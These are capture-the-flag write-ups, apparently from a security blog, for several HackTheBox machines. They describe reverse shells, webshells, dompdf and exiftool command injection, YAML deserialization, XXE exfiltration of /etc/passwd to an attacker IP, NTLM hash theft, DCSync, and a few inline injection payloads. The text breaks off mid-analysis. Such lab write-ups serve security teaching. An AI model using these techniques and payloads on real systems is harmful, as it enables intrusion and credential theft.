It’s not clear to me where the #{params[:name]} comes from. That could be a part of the POC exploit, or it could be that Ruby is parsing the URL and rebuilding it like that. As I’m not sure, it’s easy to try both. I’ll start by sending id. A bit of tinkering and eventually this URL works:
The resulting PDF:
It’s not completely clear to me why the %20 (URL-encoded space) has to be at the start of the parameter. It seems to mostly be necessary if there are spaces in the command I’m running.
To get a shell, I’ll change the URL to a bash reverse shell:
On sending, I get a connect back at nc:
And I’ll upgrade the shell using the standard script and stty trick:

Category: Shell as henry
ruby requires a password to run sudo:
Because I got a shell as ruby via an exploit, I don’t have it.
There are two user’s with home directories, ruby and henry:
As ruby, I can enter and list henry’s home directory (user.txt is there), but can’t read anything:
ruby’s home directory may appear empty at first, but .bundle is interesting:
Bundler is a dependency management tool used in Ruby projects to manage and install the required gems and their versions. The ~/.bundle folder holds configuration information in the config file, which is here:
BUNDLE_HTTPS://RUBYGEMS__ORG/ is a key that represents a RubyGems repository URL. It indicates that the configuration applies to the https://rubygems.org/ repository.
"henry:Q3c1AqGHtoI0aXAYFH" is the value associated with the key, containing the authentication credentials for accessing the RubyGems repository. In this case, the username is “henry” and the password (or API key) is “Q3c1AqGHtoI0aXAYFH”.
The config file had a password for a henry user, so I’ll try it on the box with su, and it works:
This also works to connect directly from my host over SSH as henry:
Either way, I can claim user.txt:

Category: Shell as root
henry can run a ruby script as root:
This script is used to manager Gems (packages in Ruby):
The line that is of interest here is:
Both Python and Ruby have a safe_load function for loading YAML. This is because both had issues with the original load and deserializing the YAML payload, resulting in code execution. I showed exploiting the Python version of this for Hackvent 2019 Day 19.
This gist has a really nice and succinct example of a payload that can be used to exploit YAML deserialization in Ruby. It’s based on this much longer and more detailed article.
I’ll grab the POC from the gist and paste it into a file. Wherever I save it, I’ll need to run the command from that directory:
Running now shows an error, the output of id, and then a traceback:
It’s easy to miss the id output with all the other lines, but it’s there, and that’s execution as root!
To get a shell, I’ll update my payload to copy bash and make the copy SetUID and SetGID for root:
After I run this, there’s a file at /tmp/0xdf:
Running with -p gives a shell with effective UID and GID as root:
And I can claim root.txt:
I was able to figure out that it’s a Ruby webserver behind nginx during enumeration. In exploring, I’ll want to figure out some foundational stuff about the webserver:
I’ll go through these in this video:
The short summary is that nginx is using a module named passenger. This allows nginx to handle the Ruby application. I’ll show how nginx is doing that, as well as the docs that show how that application is configured.
I’ll look at the Ruby app to see how it generates PDF and handles GET and POST requests.
I’ll also see that local hosts are not blocked, but find a DNS issue, and fix it with the hosts file such that I can export the main page to PDF.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 11 Feb 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.088s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 18.04 bionic, a very old OS.
The site doesn’t have anything to offer except a “back soon” message:
I’m not able to guess a file extension, as index.html, index.php, and index all return 404.
Looking at the HTML source, there’s a bunch of JavaScript imports:
In the debugger tab, I’ll find framework-8c5acb0054140387.js, which says it’s running the React JavaScript framework on the front end (on the client’s browser). It doesn’t give much information about the server.
The server HTTP response headers do give additional information:
X-Powered-By is Next.js, which a full stack framework that uses React plus JavaScript and Rust on the server.
There’s also a content security policy. These headers define which objects are allowed to be loaded from external hosts. In that list, there’s a bunch of Google stuff, but also prd.m.rendering-api.interface.htb. I’ll check note the new subdomain.
I’ll run feroxbuster against the main site, but it finds nothing:
Given the use of the prd.m.rendering-api.interface.htb subdomain, I’ll check for any other potential subdomains with ffuf:
I’ll do the same thing for FUZZ.rendering-api.interface.htb and FUZZ.m.rendering-api.interface.htb, but all come up empty.
I’ll add these two to my /etc/hosts file:
Loading interface.htb loads the same “back soon” message, the default response.
Visiting this just returns “File not found.”:
The HTTP response is much cleaner on this subdomain:
404 on the root is a bit odd.
I’ll run feroxbuster against this virtual host as well:
It finds only a 403 on /vendor. While feroxbuster typically recurses into directories it finds, it only does so based on some default rules. The rules look for a redirect (status code 300-399), or a success (200-299) or 403 that ends in a /. A more typical webserver configuration would return a redirect from /vendor to /vendor/ and then a 403, but this one is returning 403 on /vendor (without a slash).
Given the lack of anything else to look at, I’ll run another feroxbuster to look for files in /vendor/:
It finds more 403s with dompdf and composer. Composer is a package manager for PHP applications. dompdf is a package that creates PDFs from HTML.
When I solved this box originally, feroxbuster relied on status codes to identify what to filter. Months later, now feroxbuster has a smart filter, and it finds /api by default:
I go over these changes in feroxbuster in this video from March:
On originally solving, I don’t know about /api at this point. I’ll continue here as if that’s the case to show the thought process.
At this is the point that the box gets tricky, and it’s easy to go down rabbit holes. To get on the right path, I’ll think that there must be something on this subdomain that I’m missing, since it is using dompdf. Also, there’s the weird 404 on /. If I start poking around a bit, I may notice a lot of 404 responses of 0 length. For example, if I visit /0xdf0xdf0xdf, it returns:
But the 404 on the index had a message, and was 16 in content length. Given the different length 404s, I’ll tell ffuf to include all response codes, and filter out the 0 length responses, as those match what I got when I sent in something that isn’t a route on the host.
I could configure feroxbuster to do this, but ffuf makes it easy with -mc all to match on all status codes, and then -fs 0 to filter size of 0:
It finds /api and /vendor.
The /api endpoint returns “route not defined” as JSON:
Running ffuf again seems to show a default response of size 50 (the message above), and filtering that out, I don’t find anything else:
Because this is an API, I’ll want to check other methods as well. PUT and DELETE don’t find anything, but POST does:
Hitting this endpoint with a POST request returns “missing parameters”:
I’ll want to fuzz the parameters, but there are a few unknowns. Is the data sent as HTTP data (such as param=value), or as JSON (like {"param": "value"})? Do I need matching content type headers?
Given the responses are coming in JSON, I’ll try sending data that was as well, and I’ll filter out responses of size 36 (the “missing parameters” message):
It finds it as html!
If I jump into Repeater and send this request, it returns a PDF:
Down a bit further in the PDF it shows the version as 1.2.0:

Category: Shell as www-data
Searching for dompdf vulnerabilities, I’ll find this post from Positive Security describing an RCE exploit in dompdf version 1.2.0, which matches what is on Interface. This vulnerability is assigned CVE-2022-28368.
There is an option in dompdf to execute PHP code in the conversion, but it’s disabled by default. I’ll want to check that. But they also show how to reference a malicious font such that it will be cached by the server and then when requested it will run arbitrary PHP code, like this:
Positive Security hosts a proof of concept exploit available here, which I’ll clone to my machine with git clone https://github.com/positive-security/dompdf-rce. It seems that many more POC scripts have come out since Interface’s release. I’ll work with this original.
It has two folders along side the readme:
application holds a vulnerable application. I’m interested in exploit:
overview.png is the image I showed above.
The exploit idea is to send in HTML that loads exploit.css as a stylesheet. That file looks like:
This stylesheet will load exploit_font.php as a font. That is a binary file, but the format includes text comments. In this case, those comments are set to contain PHP (at the bottom of the image):
When dompdf gets an HTML page with CSS that loads a font, that font file will be cached at /vendor/dompdf/dompdf/lib/fonts/[family]_[style]_[m5d(url)].php. If I can access that file directly, I’ll have PHP execution.
I’ll make a couple changes to get this to work. First, I’ll update exploit.css to reference my webserver rather than localhost. Next, I’ll change the PHP in exploit_font.php to be a simple webshell, rather than phpinfo():
I’ll start a Python webserver serving these files (I don’t want a PHP webserver, as it will run my PHP in the font). In Burp Repeater, I’ll send a request with HTML that loads exploit.css as a stylesheet:
There’s a hit for the CSS file, and then the font:
To find it, I’ll need to calculate the URL of the cached font, each of which I defined in the CSS file, except the MD5 which I’ll calculate:
So the URL becomes:
It works:
Because the file is binary, I’ll need -o- to get curl to output it to STDOUT. I’m then piping that result  into tail to remove all the binary junk, printing just the last line, which is the output of the webshell.
To get a shell, I’ll convert the previous command into a POST request, with URL encoded data, just to make sure it still works:
Now I’ll replace the id with a simple Bash webshell:
It hangs, but there’s a connection at nc:
I’ll upgrade my shell with the script / ssty trick:
And I can read user.txt from dev’s home directory:

Category: Shell as root
There’s not much else of interest in dev’s home directory. www-data’s home directory (/var/www) has directories for the two virtual hosts (and an empty html folder):
There’s nothing too interesting in these either.
/srv and /opt are both empty as well. Not much to find.
Just looking at the processes running (ps auxww) doesn’t show much of interest. To look for cron jobs and other running tasks, I’ll host pspy from my box and upload it to Interface:
I’ll set it as executable and run it:
There are two sets of processes that are revealed. Every two minutes, this occurs:
And every five minutes, this:
This script, in the sbin directory (so meant to be run as root), is:
It seems to be checking for files in /tmp that are produced by dompdf and removing them.
This blog post talks about how [[ "$VAR" -eq "something" ]] can be exploited. The syntax [[ x -eq y ]] expects both x and y to be integers, and if they aren’t, evaluates them as an arithmetic expression and compares the result. This may end up being ok when comparing two strings, as if the strings are the same, their evaluated result will be as well, and likely the result will be different if they are different.
The POC exploit payload in the post that gives execution is x[$(cat /etc/passwd > /proc/$$/fd/1)]. In that one, it’s passing in to a webserver, and having it print passwd into the file descriptor 1, which should be STDOUT, which will then come back as the result of curl. I don’t get to see the STDOUT results of this script running, so I’ll have to try something different, like touch /tmp/0xdf.
To do this, I’ll need to create a file in /tmp, and give it metadata for a Producer that is my payload:
Unfortunately, this didn’t execute for me. However, with some guessing that the space may be the issue, I’ll try using ${IFS} as space (I’ve used this before many times, including on Rope and Wall), and it works!
The next time the cron runs:
Another strategy would be to just write a Bash script in /tmp or /dev/shm, set it as executable, and have that be the full payload: x=[$(/tmp/0xdf.sh)].
I’ll update my payload to create a copy of bash set as SUID:
When the cron runs, it’s there:
I’ll run it (with -p to not drop privs) and get a shell with effective UID as root:
And root.txt:
There was an unintended solution patched by HackTheBox on 15 February 2023, four days after Interface released:
It talks about an unintended solution in a cleanup script.
Working on a system before the patch, looking at the timestamps in /var/www/api/vendor/dompodf/dompdf/lib/fonts, I’ll notice they are all from November, except for one:
Not only is that from today, but it’s being updated every five minutes. That suggests it’s being replaced every five minutes. And, its owned by www-data.
It’s a bit disruptive to the box, but by making this file into a symbolic link, I can potentially overwrite important files and potentially change their ownership.
To test, I’ll make this file into a symlink that points to an unimportant file, /tmp/0xdf:
When the five-minute cron runs, /tmp/0xdf is there:
It’s owned by www-data, and has a clean version of the expected file.
There are a handful of root owned files that I could overwrite to get execution, but many come with reasons why they won’t work. For example, /etc/sudoers won’t work unless it’s owned by root:
Similarly, /root/.ssh/authorized_keys will just be ignored unless it’s owned by root and permissions 600.
I can try /etc/passwd, but it breaks things, and doesn’t quite work. The group changes, but the user does not:
And now, any auth or user-related operations on the box are dorked. I’ll need a reset.
The option that works is /etc/shadow. I’ll update the link to point to it:
After a few minutes, it’s overwritten with the PHP, and the ownership has changed:
I’ll generate a password hash using openssl:
Now I’ll write an entry in the shadow to match the format described here:
It is important to use single quotes on that echo, or the $ will be evaluated as variables. With this in place, I can su as root using the password “0xdf0xdf”:
There’s a cleanup script running as root:
The one that runs every two minutes is the one meant to be exploited. The one running every five is meant to cleanup artifacts from players for the foothold exploitation.
Today, that script is:
On release, it was:
Both start off by removing any files in the fonts directory that are modified in the last five minutes minutes. The original script then copies a clean dompdf_font_family_cache.php into fonts, and changes the ownership and group.
The patched script makes a copy within /root, and changes the ownership there. Then it moves that copy into place. This prevents the symlink attack.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 05 Nov 2022
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.087s latency).
Not shown: 65519 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknownCategory: Recon
nmap finds a bunch of open TCP ports, including DNS (53), HTTP (80), Kerberos (88), LDAP (389, 636), and other Windows ports:
This looks like a Windows DC with the domain name flight.htb, and a hostname of G0.
Lots of ports to potentially look at. I’ll prioritize SMB and Web, and check in with LDAP, Kerberos, and DNS if I don’t find what I need from them.
Given the use of DNS names, I’ll fuzz port 80 for potential subdomains with wfuzz:
I’ll add both to my /etc/hosts file along with the host name:
crackmapexec confirms the domain and host name:
It isn’t able to get any information about shares:
The site is for an airline:
Most the links are dead or just lead back to this page.
The “AIRLINES International Travel” link leads to index.html, which suggests this is a static site.
The response headers don’t give much additional information either, other than confirming what nmap also found - the web server is Apache:
There’s also a PHP version in that server header, which suggests PHP is enabled.
I’ll run feroxbuster against the site, and include -x html,php since I know the site is using .html extensions and potentially PHP:
/phpmyadmin is on the box, but returns a forbidden on visiting:
con, aux, and prn all return 403 for .php, but also these return the same for /con and /con.html. It seems more like an Apache rule match than an actual page.
Nothing else of interest.
The site is for an aviation school:
The site is all placeholder text and a few page links, but nothing interesting.
The main page is index.php. In fact, the other pages that have content have URLs of the form http://school.flight.htb/index.php?view=about.html.
It’s a very common PHP structure where different pages on a site all use index.php that defines the header and footer and menus, and then some parameter specifying what page to include as the body. These are often vulnerable to path traversal (reading outside the current directory) and local file include (including PHP code that is executed) vulnerabilities.
feroxbuster finds nothing interesting:
The same false positive blocks for con, aux, and prn show up here.

Category: Auth as svc_apache
It’s a very common PHP structure where different pages on a site all use index.php with some parameter specifying what page to include. These are often vulnerable to path traversal (reading outside the current directory) and local file include (including PHP code that is executed) vulnerabilities.
On a Linux box, I’d try to read /etc/passwd. Since this is Windows, I’ll try C:\windows\system32\drivers\etc\hosts, but it returns an error:
In fact, just having just view=\ results in the same blocked response. view=. returns nothing, but anything with .. in it also results in the blocked message.
I can try with / instead of \, make sure to use an absolute path, and it works:
Nothing interesting in that file, but it proves directory traversal and file read. It’s not yet clear if it’s an include or just a read.
To figure out if it’s a read or include and if remote files are enabled, I’ll try a remote read over HTTP. This will quickly tell me if remote files are allowed, and if so, show if the site is using include or file_get_contents.
I’ll create a dummy PHP file named poc.txt:
I’ll see if the server will load it remotely over HTTP by starting a local HTTP server and trying to include it. It works:
Unfortunately for me, its the text of the file, not processed as PHP. The source must be using file_get_contents to load the contents, not include.
Another way to include a file is over SMB. It won’t get anything that HTTP couldn’t get as far as execution, but the user will try to authenticate, and I could capture a NetNTLMv2 challenge/response (not really a hash, but often called one). I’ll start responder with sudo responder -I tun0, and then visit http://school.flight.htb/index.php?view=//10.10.14.6/share/poc.txt. There’s a hit:
hashcat will find the password used by the svc_apache account, “S@Ss!K@*t13”:
These creds work over SMB:

Category: Auth as S.Moon
crackmapexec shows the shares, including the standard administrative shares (ADMIN$, C$, and IPC$), the standard shares for a Windows DC (NETLOGON and SYSVOL), and three nonstandard shares (Shared, Users, and Web):
I’ll take a look inNETLOGON and  SYSVOL, but nothing abnormal or useful jumps out.
The Users share looks like it’s the C:\Users directory on Flight:
There’s nothing interesting in svc_apache, and svc_apache can’t get into any of the other directories.
The Shared share looks to be empty:
The Web share has folders for the two websites:
Looking around shows both are basically static websites, with no database or creds or anything useful at this point. I’ll also confirm that svc_apache can’t write to any of these folders.
I was able to get another user name, C.Bum, from the users share, but there may be more domain users. I’ll use lookupsid.py from Impacket to get a list of more:
I’ll use some Bash foo to get that into a list of usernames:
crackmapexec can also pull this list with the :
It’s not uncommon for someone in charge of a service account to reuse their password with that service account. I’ll see if any of the accounts above share that password with crackmapexec. I always like to use the --continue-on-success in case more than one match:
S.Moon uses that same password!

Category: Auth as C.Bum
In addition to the read access, S.Moon has write access to Shared:
With write access to an otherwise empty share named Shared, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. This post has a list of some of the ways this can be done. ntlm_theft is a nice tool to create a bunch of these files.
I’ll use ntml_theft.py to create all the files:
Connecting from the directory with the ntlm_theft output, I’ll upload all of them to the share:
Interestingly, a bunch are blocked. But a few do make it.
With responder still running, after a minute or two there’s a hit from C.Bum:
hashcat with rockyou will quickly return the password “Tikkycoll_431012284”:
It works:

Category: Shell as svc_apache
C.Bum has write access to the Web share:
I’ll start with a standard webshell, shell.php:
I’ll move into the styles directory in school.flight.htb, and upload it there:
I’m using styles just to be a bit more hidden. The webshell works:
To go from webshell to shell, I’ll upload nc64.exe to the same folder:
Now I’ll invoke it over the webshell:
It hangs, but at a nc listening, there’s a shell:

Category: Shell as C.Bum
As svc_apache, there’s not much I didn’t already have access to over SMB. The web directories sit at C:\xampp\htdocs, which is common for an XAMPP deployment on Windows.
There is an inetpub directory at the root of C:\. That’s the directory IIS typically runs from:
The wwwroot directory (the default server, kind of like html in /var/www with Apache on Linux) has the default stuff in it:
But there is a development directory that looks to have a real website in it:
The development directory can be written to by C.Bum:
Looking at the listening ports, there are a lot as is standard on any DC:
I’m particularly interested in the ones that I can’t reach from my VM, like 8000 (maybe the development site?).
C.Bum is a member of the WebDevs group, but not the Remote Users group:
This means I can’t use WinRM to execute commands as C.Bum in PowerShell.
The RunasCs project aims to create a binary like runas.exe but without limitations:
It’s from one of the authors of the Potato exploits, and a really nice tool to have.
I’ll download the latest release, host it with a Python web server, and upload it to Flight:
Now I’ll invoke a cmd.exe as C.Bun using -r to redirect STDIN/STDOUT to my host:
With nc listening on my box, there’s a connection:
I can now get user.txt:

Category: Shell as defaultapppoll
I’ll take a look at the development website. To do this, I’ll upload Chisel:
Now I’ll start the server on my VM:
I use -p 8000 to listen on 8000 (the default port of 8080 is already in use by Burp), and give it --reverse to allow incoming connections to open listeners on my host that tunnel back through them.
I’ll connect from Flight, tunneling port 8001 on my host through the tunnel to 8000 on Flight:
Visiting http://127.0.0.1:8001 in Firefox returns another site:
Nothing useful on the page. There’s a /contact.html that doesn’t have any useful information either.
The response headers show that the site is hosted by IIS (rather than Apache):
They also show X-Powered-By: ASP.NET. Typically that means that .aspx type pages are in use.
I’ll remember that C.Bum should have write access to this directory. I’ll test that out with a dummy file:
The text loads:
To see if ASPX code will run, I’ll create a silly ASPX file that writes a string, poc.aspx:
I’ll upload that over SMB, and then copy it into the development directory:
On visiting the page, it works:
To run commands, I’ll download this aspx webshell from GitHub, upload it over SMB, and copy it into place:
Loading the page shows a form:
Clicking “Run” shows the output below:
My copy of nc64.exe has long been wiped by resets, but I’ll upload it back to \programdata, and then execute it via the webshell:
At my nc listener, I get a shell as defaultapppool:

Category: Shell as administrator
iis apppool\defaultapppool is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. For example, if I start responder and then try to open an SMB share on it (net use \\10.10.14.6\doesntmatter), the account I see trying to authenticate is flight\G0$:
I won’t be able to crack that NetNTLMv2 because the machine accounts use long random passwords. But it does show that the defaultapppool account is authenticating as the machine account.
To abuse this, I’ll just ask the machine for a ticket for the machine account over the network. I showed this same attack as an unintended method in PivotAPI.
Rather than compile it myself, I’ll grab the latest compiled version of the binary from SharpCollection. I’ll host it with Python HTTP, and upload it to Flight:
To create a ticket, I’ll use the tgtdeleg command:
With a ticket for the machine account, I can do a DCSync attack, effectively telling the DC that I’d like to replicate all the information in it to myself. To do that, I’ll need to configure Kerberos on my VM to use the ticket I just dumped.
I’ll decode the base64 ticket and save it as ticket.kirbi. Then kirbi2ccache will convert it to the format needed by my Linux system:
Now I’ll export the environment variable to hold that ticket:
It’s really common when doing these kinds of attacks to run into time issues. When I run secretsdump.py from Impacket to dump all the hashes from the DC, it fails:
It suggests adding -just-dc-user:
-just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
I’ll go for administrator, but it still fails:
Here’s the real issue - KRB_AP_ERR_SKEW.
I’ll fix the time with ntpdate, telling it to set my time to the NTP server on Flight:
This will likely drop my VPN connection, but after reconnecting, I can dump the hashes:
It works now without -just-dc-user as well:
Those hashes work for a pass the hash attack:
It shows Pwn3d! because the creds are good and this is an administrator account.
psexec.py works to get a shell from here:
And the final flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 29 Oct 2022
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.083s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds three open TCP ports, FTP (21), SSH (22), and HTTP (80):
Based on the OpenSSH, the host is likely running Debian 11 bullseye. HTTP has a redirect to metapress.htb.
nmap is typically pretty good about identifying anonymous login on FTP (and it doesn’t here), but I’ll check just in case. Typically if it’s enabled, I can connect with the username “anonymous” and any (or a blank) password. It fails here:
I’ll have to check back when I have creds.
Because there’s use of domain names and virtual host routing, I’ll fuzz for other subdomains with wfuzz. I’m going to send tons of requests changing the Host header to see if I get a different response.
I’ll start with no filter, and quickly Crtl-c to kill it:
The default case is a 302 of length 145. I’ll add --hh 145 to hide those responses, and start again:
It finds nothing. I’ll add the domain to my /etc/hosts file:
The site is for a soon to launch service that doesn’t say much about what it is:
There’s a footer at the bottom of all pages that a few interesting elements:
The post doesn’t say much, but has a link to /events/ that has some kind of widget for scheduling events:
This is clearly some kind of WordPress plugin handling the scheduling.
The site says it’s WordPress, and that’s confirmed looking at the page source. Specifically on the scheduling page:
Not only is there a wp-content directory, but references to “bookingpress-appointment-booking”, which is likely the plugin for scheduling, and seems to match nicely with this. Also in the page is a good indication of the WordPress version, 5.6.2:
Given that it’s WordPress, it’s written in PHP, which is also in the HTTP response headers:
Given the WordPress site, I can run wpscan or brute force directories with FeroxBuster, but I actually have all I need right now.

Category: Shell as jnelson
Searching for exploits in the BookingPress plugin finds an unauthenticated SQL injection in version less than 1.0.11:
I’ll ignore the links that reference MetaTwo and start with the wpscan link which offers these steps as a proof of concept:
The first two steps are something that someone setting up the environment would do. Step three is to get the nonce. A nonce (short for “[number once]”(https://www.okta.com/identity-101/nonce/)) is just a random value that’s meant to be used once.
Step 4 is a UNION injection, which seems to show that there are nine columns in the table being queried. On success, I should see the version, version comment, the os, potentially the numbers 1 through 6 in the result.
On /events/, I’ll find the nonce in the source:
Now I’ll make that curl:
It looks like potentially all of the values are displayed back.
Despite the argument being called nonce, I am able to use the same value again and again. I’ll run that same curl with -x http://127.0.0.1:8080 to proxy it through my Burp instance. Now I’ll right click on the request, and “Copy to file”. The resulting file looks like:
I’ll edit the injection payload out, replacing it with a number:
Now when I run sqlmap, I can give it -r sqli.req (the file name with that request) and I’ll give it -p total_service to show it where to look for the injection (it would find it eventually without that, but this speeds things up by reducing the number of places to check):
Now that sqlmap has identified the injection, I can use it to enumerate the database. --dbs will list the databases:
To check out the tables in blog, I’ll use -D blog and --tables:
wp_users is always a good place to start. I’ll dump that table with -T wp_users and --dump:
There are other tables I can look at, but they are pretty empty.
I’ll save the two hashes with their usernames in a file, wp.hashes:
hashcat takes that file, identifies the hash type, and cracks the manager password very quickly:
I need to give it --user to tell it to remove up to the first : as the username, and use the hash after that. On my computer it took about 11 minutes to go through all of rockyou.txt, and it fails to break admin’s hash.
Those creds do not work for SSH or FTP.
To log in to WordPress, I’ll visit /wp-admin and it redirects to the login page:
Unsurprisingly the manager creds work here:
manager doesn’t have very much priviliege in this admin panel. If I had access as an admin user, I would look at modifying a template or uploading a malicious plugin to get execution via WordPress. manager is basically limited to media uploads.
Some searching for vulnerabilities in WordPress 5.6.2 leads to this post from the WPSec blog about CVE-2021-29447, an XML external entities (XXE) vulnerability in the media manager for this version of WordPress. The post has a ton of detail of exactly what is going on and is a good read.
To exploit this, I’ll need two files. First, I’ll make a payload.wav file, using the command from the post, replacing their IP with mine:
This has the magic bytes of a waveform audio file, RIFF????WAVE (where ? is anything), but then it has an XML body with an XXE attack payload. It will reach back to my server and try to load a .dtd file.
A DTD (Document Type Definition) file is used to define the structure and content of an XML (eXtensible Markup Language) document. It specifies the elements, attributes, and their relationship to one another that can appear in the XML document. The DTD file acts as a set of rules that the XML document must follow to be considered valid.
The second file to create is that .dtd file:
This file does two things. It reads the /etc/passwd file, base64-encodes the result, storing it as a XML variable file. Next it tries to load http://10.10.14.6/?p=%file;, effectively exfiling the data to my server.
I’ll start a Python webserver with the .dtd file in that directory, and upload the .wav file into the media manager:
It looks successfully uploaded, and there’s contact at my server:
That decodes to a passwd file:
I’ll note the user jnelson.
Before finding the WPSec blog, I wasted a lot of time working with the POC from this page from wpsan:
I couldn’t get it to work, and I believe there are two big issues with this POC. First, it doesn’t tell you that BBBB needs to be replaced by a little-endian length of the payload. Second, the BBBB bytes are in the wrong spot, as they need to be after the iXML.
The broken POC above does show something interesting. It’s using a relative path to read ../wp-config.php. That’s useful, as it means I don’t have to figure out where on the file system the web root is to read this kind of file. I’ll update my evil.dtd to use that file path, and upload payload.wav again. This time there’s new data in the exfil, and it decodes to:
WordPress is configured with configuration variables to access FTP:
I’ll connect, and it works:
The FTP root has two folders:
The blog folder seems to have the website:
I’ll grab the .htaccess file as that can have creds in it, but nothing useful this time. I can’t write to the folder:
If I was able to, I could write a webshell and get execution that way.
The mailer folder has a script and another folder:
The script is using PHP to send emails, and in the middle, there are creds for the SMTP server:
I noted above that jnelson was an account in the passwd file. Those creds work for SSH:
And I can read user.txt:

Category: Shell as root
jnelson can’t run anything as root with sudo:
In their home directory, there’s an interesting hidden folder, .passpie:
This looks to be for an opensource command line password manager, passpie. Running it prints some passwords:
Running with --help will show the possible commands. Anything that might print the password like copy or export prompts to ask for a password:
The passpie directory has a folder named ssh (which is the name on both entries), as well as two files, .confg and .keys. .config is just {}. .keys is a PGP key, with public and private blocks.
ssh has two files, each with the same format:
The file is YAML with metadata and where the password would be, a PGP encrypted message.
I’ll copy the key to my host with scp:
To format the key into a hash that can be cracked, I’ll try to run gpg2john, but it complains:
I’ll remove the public block, and re-run, and it works:
Hashcat doesn’t seem to support GPG yet, so I’ll use john. It breaks almost instantly:
I’ll use the passpie copy command, which has a --to parameter:
It works:
From there, su will give a root shell:
And the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 21 Jan 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 focal.
There’s a redirect on port 80 to eforenzics.htb. I’ll use wfuzz to look for any subdomains that respond differently, but not find anything. I’ll add this to my hosts file:
The site is for a forensics company:
All the links in the page are to other places on the page except for ones that go to /service.html. This page offers “Image Forensics”, specifically on JPG files:
On giving it a JPG, it offers a link to a “report”:
That report is [original filename with special characters removed].txt. So htb.jpg becomes htbjpg.txt:
This is the output of Exiftool.
The pages on the site are index.html and services.html. However, when I upload an image it goes to upload.php, so it’s a PHP site with mostly static pages.
As noted above, Exiftool is being used to get metadata on the images, and the output shows it’s version 12.37.
I’ll run feroxbuster against the site, and include -x php,html:
There’s a bunch there, but nothing interesting.

Category: Shell as www-data
Googling for “exiftool 12.37”, the top result is about a command injection vulnerability in Exiftool before 12.38:
The issue, as described in this gist, is in how Perl handles filenames ending in | with the open command. In Pikaboo I walked through abusing this on a script that was using Perl’s <> operator, which is a shorthand that includes a call to open. Exiftool is written in Perl, and before version 12.38, was missing that the filename (user controlled) could be used to get command execution.
There’s a different CVE in Exiftool that I exploited in Meta, CVE-2021-22204. That one involved poisoning the metadata, not the filename.
Nothing in this section is required to continue with exploitation of Investigation. The gist gives a POC that I can move forward with, but it’s still interesting and worthwhile to understand how vulnerabilities work. I’ll explore that in this video:
The summary points are:
To test this out, I’ll find the HTTP request where I submit an image in Burp Proxy history, and send it to Repeater:
The filename is set in the form data metadata. I’ll change it to ping -c 10.10.14.6| and start tcpdump to listen for ICMP. On sending the request, an ICMP packet comes back:
That’s code execution on Investigation.
To get a shell, I’ll try a bash reverse shell. It doesn’t work in raw form, likely because of the special characters required. I’ll base64-encode the shell, messing with extra whitespace until there’s no special characters (not always required, but can be helpful):
Now I’ll send that as the filename:
It hangs, but there’s a shell at a listening nc:
I’ll upgrade the shell using the standard trick:

Category: Shell as smorton
There’s a single home directory on the box, and www-data can’t access it:
There’s not too much else interesting on the file system. I’ll look for files owned by smorton:
The investigation directory is worth further investigation.
There are two files in the directory:
analysed_log is always 0 bytes. There’s actually a cron running as www-data that should be writing to it every five minutes before it clears the images and analysis:
The problem is, somehow analysed_log got set as immutable:
So when the cron tries to write to it, it fails:
Because the commands are joined with &&, once the first one fails, it stops, and the cleanup is broken as well.
I’ll exfil the .msg file with nc, starting a listener on my machine, and then sending the file back:
It arrives at my machine:
I’ll double check that the MD5 hashes of each match.
.msg files are Outlook messages. Without a copy of Outlook handy, I’ll use msgconvert (installed with sudo apt install libemail-outlook-message-perl) to convert it to mbox format:
This writes the message into a mailbox in the emails.mbox  file. I’ll open it with mutt -f emails.mbox. When it asks about creating a Mail file, I’ll select no, and it opens the mailbox with a single email:
I’ll hit enter to go into the email:
There’s a message from Tom and an attachment. I’ll hit v to view the attachments:
I’ll arrow key down to evtx-logs.zip and push s to save. After exiting mutt, I’ll unzip the attachment:
The file is a Windows Vista Event log:
To get this into a format I can analyze, I’ll convert the events to JSON. I played with a few different tools from GitHub to do this, but liked evtx_dump from this repo by omerbenamram. I’ll download the latest release and drop it in a folder in my boxes path.
The trick is to use the output format jsonl and not json. json will include lines with record numbers that breaks tools like jq when it tries to parse it. jsonl puts it all on one line of JSON, which jq can then parse:
I’ll start by getting a feel for the different types of logs present and their frequency:
The most common log type is 4673 (A privileged service was called) with over five thousand logs. Then there’s 4703 (A token right was adjusted) at over four thousand. I’ll take a look at these, but it doesn’t lead anywhere.
I’ll also take a look at the different log types. To show each one, I’ll use the reference I cited above in a Bash loop with a bit of grep to get the title:
Some interesting ones jump out:
There are probably others that might be interesting as well. I’ll start to work my way through these.
I’ll find something interesting looking at the successful and failed logins. The note from Tom mentions checking to see if analysts are logging into the investigation station.
I’ll filter out based on event ID and get a lot of data about each event:
I’ll print the username and domain for each for each with a count for how many times:
If I take the same look at the unsuccessful logins by changing the filter from 4624 to 4625, I’ll find three:
